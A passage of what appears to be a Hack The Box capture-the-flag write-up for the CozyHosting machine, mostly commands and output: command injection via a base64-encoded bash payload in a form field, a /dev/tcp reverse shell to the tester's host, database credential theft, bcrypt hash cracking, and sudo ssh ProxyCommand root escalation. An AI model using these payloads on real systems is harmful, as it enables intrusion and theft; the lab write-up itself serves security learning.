+</span></span><span style="display:flex;"><span>Cookie<span style="color:#f92672">:</span> <span style="color:#ae81ff">JSESSIONID=&#34;20EDCBE6C9905D775758D2997A7BC920&#34;</span>
+</span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">close</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>host=127.0.0.1&amp;username=;echo${IFS}&#34;bHM=&#34;|base64${IFS}-d|bash;
+</span></span></code></pre></div><ul>
+<li>Response:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">HTTP/1.1 302 
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Server: nginx/1.18.0 (Ubuntu)
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Date: Sun, 01 Oct 2023 19:11:12 GMT
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Content-Length: 0
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Location: http://cozyhosting.htb/admin?error=usage: ssh [-46AaCfGgKkMNnqsTtVvXxYy] [-B bind_interface]           [-b bind_address] [-c cipher_spec] [-D [bind_address:]port]           [-E log_file] [-e escape_char] [-F configfile] [-I pkcs11]           [-i identity_file] [-J [user@]host[:port]] [-L address]           [-l login_name] [-m mac_spec] [-O ctl_cmd] [-o option] [-p port]           [-Q query_option] [-R address] [-S ctl_path] [-W host:port]           [-w local_tun[:remote_tun]] destination [command [argument ...]]base64: invalid input/bin/bash: line 1: @127.0.0.1: command not found
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Connection: close
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">X-Content-Type-Options: nosniff
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">X-XSS-Protection: 0
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Cache-Control: no-cache, no-store, max-age=0, must-revalidate
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Pragma: no-cache
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Expires: 0
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">X-Frame-Options: DENY
+</span></span></span></code></pre></div><p>Now I open a <code>Listening Port</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nc -lnvp <span style="color:#ae81ff">9001</span>               
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">9001</span> ...
+</span></span></code></pre></div><p>The My Payload:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>sh -i &gt;&amp; /dev/tcp/10.10.14.149/9001 0&gt;&amp;<span style="color:#ae81ff">1</span>
+</span></span></code></pre></div><p>I encode it to base64, and I send it:</p>
+<ul>
+<li>Request:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">POST</span> /executessh <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">cozyhosting.htb</span>
+</span></span><span style="display:flex;"><span>Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">114</span>
+</span></span><span style="display:flex;"><span>Cache-Control<span style="color:#f92672">:</span> <span style="color:#ae81ff">max-age=0</span>
+</span></span><span style="display:flex;"><span>Upgrade-Insecure-Requests<span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>Origin<span style="color:#f92672">:</span> <span style="color:#ae81ff">http://cozyhosting.htb</span>
+</span></span><span style="display:flex;"><span>Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">application/x-www-form-urlencoded</span>
+</span></span><span style="display:flex;"><span>User-Agent<span style="color:#f92672">:</span> <span style="color:#ae81ff">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36</span>
+</span></span><span style="display:flex;"><span>Accept<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span>
+</span></span><span style="display:flex;"><span>Referer<span style="color:#f92672">:</span> <span style="color:#ae81ff">http://cozyhosting.htb/admin</span>
+</span></span><span style="display:flex;"><span>Accept-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">gzip, deflate</span>
+</span></span><span style="display:flex;"><span>Accept-Language<span style="color:#f92672">:</span> <span style="color:#ae81ff">en-US,en;q=0.9</span>
+</span></span><span style="display:flex;"><span>Cookie<span style="color:#f92672">:</span> <span style="color:#ae81ff">JSESSIONID=&#34;20EDCBE6C9905D775758D2997A7BC920&#34;</span>
+</span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">close</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>host=127.0.0.1&amp;username=;echo${IFS}&#34;c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTQ5LzkwMDEgMD4mMQ==&#34;|base64${IFS}-d|bash;
+</span></span></code></pre></div><ul>
+<li>Reverse Shell:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nc -lnvp <span style="color:#ae81ff">9001</span>               
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">9001</span> ...
+</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>10.10.14.149<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.11.230<span style="color:#f92672">]</span> <span style="color:#ae81ff">44268</span>
+</span></span><span style="display:flex;"><span>sh: 0: can<span style="color:#e6db74">&#39;t access tty; job control turned off
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">$ python3  -c &#39;</span>import pty; pty.spawn<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/bin/bash&#34;</span><span style="color:#f92672">)</span><span style="color:#960050;background-color:#1e0010">&#39;</span>
+</span></span><span style="display:flex;"><span>app@cozyhosting:/app$ whoami
+</span></span><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span>app
+</span></span><span style="display:flex;"><span>app@cozyhosting:/app$ ls
+</span></span><span style="display:flex;"><span>ls
+</span></span><span style="display:flex;"><span>cloudhosting-0.0.1.jar 
+</span></span></code></pre></div><p>I see a file, I trasfer it in the Local Machine:</p>
+<ul>
+<li>I start a <code>Web Server</code> in a Target Machine:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>app@cozyhosting:/app$ python3 -m http.server <span style="color:#ae81ff">1234</span>
+</span></span><span style="display:flex;"><span>python3 -m http.server <span style="color:#ae81ff">1234</span>
+</span></span><span style="display:flex;"><span>Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">1234</span> <span style="color:#f92672">(</span>http://0.0.0.0:1234/<span style="color:#f92672">)</span> ...
+</span></span></code></pre></div><p>I take the file in the Local Machine:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/cozyhosting<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ curl http://cozyhosting.htb:1234/cloudhosting-0.0.1.jar -O cloudhosting-0.0.1.jar
+</span></span><span style="display:flex;"><span>  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+</span></span><span style="display:flex;"><span>                                 Dload  Upload   Total   Spent    Left  Speed
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">7</span> 57.4M    <span style="color:#ae81ff">7</span> 4384k    <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span>   240k      <span style="color:#ae81ff">0</span>  0:04:04  0:00:18  0:03:46  374k
+</span></span></code></pre></div><p>I extract all files, and I find in this file <code>/BOOT-INF/classes/application.properties</code> the credentials for the locally running database which is using postgres:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>server.address<span style="color:#f92672">=</span>127.0.0.1
+</span></span><span style="display:flex;"><span>server.servlet.session.timeout<span style="color:#f92672">=</span>5m
+</span></span><span style="display:flex;"><span>management.endpoints.web.exposure.include<span style="color:#f92672">=</span>health,beans,env,sessions,mappings
+</span></span><span style="display:flex;"><span>management.endpoint.sessions.enabled <span style="color:#f92672">=</span> true
+</span></span><span style="display:flex;"><span>spring.datasource.driver-class-name<span style="color:#f92672">=</span>org.postgresql.Driver
+</span></span><span style="display:flex;"><span>spring.jpa.database-platform<span style="color:#f92672">=</span>org.hibernate.dialect.PostgreSQLDialect
+</span></span><span style="display:flex;"><span>spring.jpa.hibernate.ddl-auto<span style="color:#f92672">=</span>none
+</span></span><span style="display:flex;"><span>spring.jpa.database<span style="color:#f92672">=</span>POSTGRESQL
+</span></span><span style="display:flex;"><span>spring.datasource.platform<span style="color:#f92672">=</span>postgres
+</span></span><span style="display:flex;"><span>spring.datasource.url<span style="color:#f92672">=</span>jdbc:postgresql://localhost:5432/cozyhosting
+</span></span><span style="display:flex;"><span>spring.datasource.username<span style="color:#f92672">=</span>postgres
+</span></span><span style="display:flex;"><span>spring.datasource.password<span style="color:#f92672">=</span>Vg&amp;nvzAQ7XxR
+</span></span></code></pre></div><p>I login to database:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>app@cozyhosting:/app$ psql -h localhost -d cozyhosting -U postgres
+</span></span><span style="display:flex;"><span>psql -h localhost -d cozyhosting -U postgres
+</span></span><span style="display:flex;"><span>Password <span style="color:#66d9ef">for</span> user postgres: Vg&amp;nvzAQ7XxR
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>psql <span style="color:#f92672">(</span>14.9 <span style="color:#f92672">(</span>Ubuntu 14.9-0ubuntu0.22.04.1<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>SSL connection <span style="color:#f92672">(</span>protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Type <span style="color:#e6db74">&#34;help&#34;</span> <span style="color:#66d9ef">for</span> help.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>cozyhosting<span style="color:#f92672">=</span><span style="color:#75715e">#</span>
+</span></span></code></pre></div><p>I  list the available databases with the <code>\list</code> command:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>cozyhosting-# <span style="color:#ae81ff">\l</span>ist
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">\l</span>ist
+</span></span><span style="display:flex;"><span>WARNING: terminal is not fully functional
+</span></span><span style="display:flex;"><span>Press RETURN to <span style="color:#66d9ef">continue</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>List of databases
+</span></span><span style="display:flex;"><span>Name|Owner|Encoding|Collate|Ctype|Access privileges
+</span></span><span style="display:flex;"><span>cozyhosting|postgres|UTF8|en_US.UTF-8|en_US.UTF-8|
+</span></span><span style="display:flex;"><span>postgres|postgres|UTF8|en_US.UTF-8|en_US.UTF-8|
+</span></span><span style="display:flex;"><span>template0|postgres|UTF8|en_US.UTF-8|en_US.UTF-8|<span style="color:#f92672">=</span>c/postgres
+</span></span><span style="display:flex;"><span>postgres<span style="color:#f92672">=</span>CTc/postgres
+</span></span><span style="display:flex;"><span>template1|postgres|UTF8|en_US.UTF-8|en_US.UTF-8|<span style="color:#f92672">=</span>c/postgres
+</span></span><span style="display:flex;"><span>postgres<span style="color:#f92672">=</span>CTc/postgres
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span><span style="color:#ae81ff">4</span> rows<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>END<span style="color:#f92672">)</span>q
+</span></span><span style="display:flex;"><span>Now I’ll connect to the <span style="color:#e6db74">`</span>cozyhoting<span style="color:#e6db74">`</span> database using <span style="color:#e6db74">`</span><span style="color:#ae81ff">\c</span> cozyhosting<span style="color:#e6db74">`</span>. Then, I’ll enumerate the available tables using <span style="color:#e6db74">`</span><span style="color:#ae81ff">\d</span><span style="color:#e6db74">`</span>.
+</span></span></code></pre></div><p>Now I connect to the <code>cozyhoting</code> database using <code>\c cozyhosting</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>cozyhosting-# <span style="color:#ae81ff">\c</span> cozyhosting
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">\c</span> cozyhosting
+</span></span><span style="display:flex;"><span>SSL connection <span style="color:#f92672">(</span>protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>You are now connected to database <span style="color:#e6db74">&#34;cozyhosting&#34;</span> as user <span style="color:#e6db74">&#34;postgres&#34;</span>.
+</span></span></code></pre></div><p>Then I enumerate the available tables using <code>\d</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>cozyhosting-# <span style="color:#ae81ff">\d</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">\d</span>
+</span></span><span style="display:flex;"><span>WARNING: terminal is not fully functional
+</span></span><span style="display:flex;"><span>Press RETURN to <span style="color:#66d9ef">continue</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>List of relations
+</span></span><span style="display:flex;"><span>Schema|Name|Type|Owner
+</span></span><span style="display:flex;"><span>public|hosts|table|postgres
+</span></span><span style="display:flex;"><span>public|hosts_id_seq|sequence|postgres
+</span></span><span style="display:flex;"><span>public|users|table|postgres
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span><span style="color:#ae81ff">3</span> rows<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>END<span style="color:#f92672">)</span>q
+</span></span></code></pre></div><p>I dump the content of users table:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>cozyhosting<span style="color:#f92672">=</span><span style="color:#75715e">#  SELECT * from users;</span>
+</span></span><span style="display:flex;"><span> SELECT * from users;
+</span></span><span style="display:flex;"><span>WARNING: terminal is not fully functional
+</span></span><span style="display:flex;"><span>Press RETURN to <span style="color:#66d9ef">continue</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>name|password|role
+</span></span><span style="display:flex;"><span>kanderson|$2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim|User
+</span></span><span style="display:flex;"><span>admin|$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm|Admin
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span><span style="color:#ae81ff">2</span> rows<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>END<span style="color:#f92672">)</span>q
+</span></span></code></pre></div><p>I crack the admin hash:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/cozyhosting<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ touch hash                                                                
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/cozyhosting<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ echo <span style="color:#e6db74">&#39;$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm&#39;</span> &gt; hash
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/cozyhosting<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ john hash -wordlist:/usr/share/wordlists/rockyou.txt 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Using default input encoding: UTF-8
+</span></span><span style="display:flex;"><span>Loaded <span style="color:#ae81ff">1</span> password hash <span style="color:#f92672">(</span>bcrypt <span style="color:#f92672">[</span>Blowfish 32/64 X3<span style="color:#f92672">])</span>
+</span></span><span style="display:flex;"><span>Cost <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>iteration count<span style="color:#f92672">)</span> is <span style="color:#ae81ff">1024</span> <span style="color:#66d9ef">for</span> all loaded hashes
+</span></span><span style="display:flex;"><span>Will run <span style="color:#ae81ff">2</span> OpenMP threads
+</span></span><span style="display:flex;"><span>Press <span style="color:#e6db74">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style="color:#66d9ef">for</span> status
+</span></span><span style="display:flex;"><span>manchesterunited <span style="color:#f92672">(</span>?<span style="color:#f92672">)</span>     
+</span></span><span style="display:flex;"><span>1g 0:00:00:36 DONE <span style="color:#f92672">(</span>2023-10-01 16:02<span style="color:#f92672">)</span> 0.02730g/s 76.65p/s 76.65c/s 76.65C/s dougie..keyboard
+</span></span><span style="display:flex;"><span>Use the <span style="color:#e6db74">&#34;--show&#34;</span> option to display all of the cracked passwords reliably
+</span></span><span style="display:flex;"><span>Session completed. 
+</span></span></code></pre></div><p>Now I see all users in the system:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>app@cozyhosting:/app$ cat /etc/passwd | grep <span style="color:#e6db74">&#39;/usr/bin/bash&#39;</span>
+</span></span><span style="display:flex;"><span>cat /etc/passwd | grep <span style="color:#e6db74">&#39;/usr/bin/bash&#39;</span>
+</span></span><span style="display:flex;"><span>josh:x:1003:1003::/home/josh:/usr/bin/bash
+</span></span></code></pre></div><p>Credentials:</p>
+<pre tabindex="0"><code>josh:manchesterunited
+</code></pre><p>I login like josh:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ ssh josh@cozyhosting.htb 
+</span></span><span style="display:flex;"><span>josh@cozyhosting.htb<span style="color:#960050;background-color:#1e0010">&#39;</span>s password: 
+</span></span><span style="display:flex;"><span>Welcome to Ubuntu 22.04.3 LTS <span style="color:#f92672">(</span>GNU/Linux 5.15.0-82-generic x86_64<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> * Documentation:  https://help.ubuntu.com
+</span></span><span style="display:flex;"><span> * Management:     https://landscape.canonical.com
+</span></span><span style="display:flex;"><span> * Support:        https://ubuntu.com/advantage
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  System information as of Sun Oct  <span style="color:#ae81ff">1</span> 08:08:53 PM UTC <span style="color:#ae81ff">2023</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  System load:           0.2099609375
+</span></span><span style="display:flex;"><span>  Usage of /:            55.0% of 5.42GB
+</span></span><span style="display:flex;"><span>  Memory usage:          26%
+</span></span><span style="display:flex;"><span>  Swap usage:            0%
+</span></span><span style="display:flex;"><span>  Processes:             <span style="color:#ae81ff">253</span>
+</span></span><span style="display:flex;"><span>  Users logged in:       <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>  IPv4 address <span style="color:#66d9ef">for</span> eth0: 10.10.11.230
+</span></span><span style="display:flex;"><span>  IPv6 address <span style="color:#66d9ef">for</span> eth0: dead:beef::250:56ff:feb9:1c27
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Expanded Security Maintenance <span style="color:#66d9ef">for</span> Applications is not enabled.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span> updates can be applied immediately.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Enable ESM Apps to receive additional future security updates.
+</span></span><span style="display:flex;"><span>See https://ubuntu.com/esm or run: sudo pro status
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>The list of available updates is more than a week old.
+</span></span><span style="display:flex;"><span>To check <span style="color:#66d9ef">for</span> new updates run: sudo apt update
+</span></span><span style="display:flex;"><span>Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Last login: Sun Oct  <span style="color:#ae81ff">1</span> 18:47:00 <span style="color:#ae81ff">2023</span> from 10.10.14.25
+</span></span><span style="display:flex;"><span>josh@cozyhosting:~$ whoami
+</span></span><span style="display:flex;"><span>josh
+</span></span><span style="display:flex;"><span>josh@cozyhosting:~$ ls
+</span></span><span style="display:flex;"><span>cve-2021-4034  CVE-2021-4034-main.zip  exploit.sh  user.txt
+</span></span><span style="display:flex;"><span>josh@cozyhosting:~$ 
+</span></span></code></pre></div><p>I take the user flag:</p>
+<pre tabindex="0"><code>josh@cozyhosting:~$ cat user.txt
+66a5d304dde873628940ce1248ad060e
+</code></pre><h2 id="privilege-escalation">Privilege Escalation<a href="#privilege-escalation" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>I check the sudo permissions:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>josh@cozyhosting:~$ sudo -l
+</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#66d9ef">for</span> josh on localhost:
+</span></span><span style="display:flex;"><span>    env_reset, mail_badpass,
+</span></span><span style="display:flex;"><span>    secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin<span style="color:#ae81ff">\:</span>/snap/bin, use_pty
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>User josh may run the following commands on localhost:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> /usr/bin/ssh *
+</span></span></code></pre></div><p>I can exploit the  <code>sudo permission</code> to the  <code>ssh</code> command through ProxyCommand option to spawn a root shell:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>josh@cozyhosting:~$ sudo ssh -o ProxyCommand<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;;sh 0&lt;&amp;2 1&gt;&amp;2&#39;</span> x
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># whoami</span>
+</span></span><span style="display:flex;"><span>root
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># cd /root    </span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># ls -all</span>
+</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">40</span>
+</span></span><span style="display:flex;"><span>drwx------  <span style="color:#ae81ff">5</span> root root <span style="color:#ae81ff">4096</span> Aug <span style="color:#ae81ff">14</span> 13:37 .
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">19</span> root root <span style="color:#ae81ff">4096</span> Aug <span style="color:#ae81ff">14</span> 14:11 ..
+</span></span><span style="display:flex;"><span>lrwxrwxrwx  <span style="color:#ae81ff">1</span> root root    <span style="color:#ae81ff">9</span> May <span style="color:#ae81ff">18</span> 15:00 .bash_history -&gt; /dev/null
+</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">3106</span> Oct <span style="color:#ae81ff">15</span>  <span style="color:#ae81ff">2021</span> .bashrc
+</span></span><span style="display:flex;"><span>drwx------  <span style="color:#ae81ff">2</span> root root <span style="color:#ae81ff">4096</span> Aug  <span style="color:#ae81ff">8</span> 10:10 .cache
+</span></span><span style="display:flex;"><span>-rw-------  <span style="color:#ae81ff">1</span> root root   <span style="color:#ae81ff">56</span> Aug <span style="color:#ae81ff">14</span> 13:37 .lesshst
+</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">3</span> root root <span style="color:#ae81ff">4096</span> May <span style="color:#ae81ff">11</span> 19:21 .local
+</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> root root  <span style="color:#ae81ff">161</span> Jul  <span style="color:#ae81ff">9</span>  <span style="color:#ae81ff">2019</span> .profile
+</span></span><span style="display:flex;"><span>lrwxrwxrwx  <span style="color:#ae81ff">1</span> root root    <span style="color:#ae81ff">9</span> May <span style="color:#ae81ff">18</span> 15:00 .psql_history -&gt; /dev/null
+</span></span><span style="display:flex;"><span>-rw-r-----  <span style="color:#ae81ff">1</span> root root   <span style="color:#ae81ff">33</span> Oct  <span style="color:#ae81ff">1</span> 15:21 root.txt
+</span></span><span style="display:flex;"><span>drwx------  <span style="color:#ae81ff">2</span> root root <span style="color:#ae81ff">4096</span> Oct  <span style="color:#ae81ff">1</span> 15:34 .ssh
+</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> root root   <span style="color:#ae81ff">39</span> Aug  <span style="color:#ae81ff">8</span> 10:19 .vimrc
+</span></span></code></pre></div><p>I take the user flag:</p>
+<pre tabindex="0"><code># cat root.txt
+eec14e15d3b39d0c568cb0f9d15b0460
+</code></pre>
+      </div></div>
+
+  
+    
+<div class="pagination">
+    <div class="pagination__title">
+        <span class="pagination__title-h">Read other posts</span>
+        <hr />
+    </div>
+    <div class="pagination__buttons">
+        
+        
+        <span class="button next">
+            <a href="/posts/wifinetic/">
+                <span class="button__text">HTB Writeup - Wifinetic (Easy)</span>
+                <span class="button__icon">→</span>
+            </a>
+        </span>
+        
+    </div>
+</div>
+
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2023 Powered by <a href="https://gohugo.io">CyberSpider</a></span> 
+    
+        <span>::  </span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
